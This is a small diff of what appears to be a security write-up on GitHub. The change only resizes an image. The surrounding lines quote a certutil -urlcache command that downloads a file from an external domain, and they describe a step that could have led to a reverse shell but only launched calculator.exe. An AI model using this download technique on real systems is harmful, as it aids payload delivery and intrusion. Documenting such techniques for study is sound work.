@@ -73,9 +73,7 @@ Command used: `certutil -urlcache -split -f https://fisher-promarriage-untremend
 <img width="650" height="186" alt="image" src="https://github.com/user-attachments/assets/3256cdf0-ce4c-4ad2-af2a-8ca2910c91ea" />
 
 5. After executing the downloaded file, a new file was ready to be executed which could lead to a reverse shell, but I decided to let it just execute calculator.exe
-<img width="650" height="918" alt="image" src="https://github.com/user-attachments/assets/d0ca2bac-2888-4499-88fb-ada1aa6f0c84" />
-
-
+<img width="450" height="918" alt="image" src="https://github.com/user-attachments/assets/d0ca2bac-2888-4499-88fb-ada1aa6f0c84" />
 
 
 ---
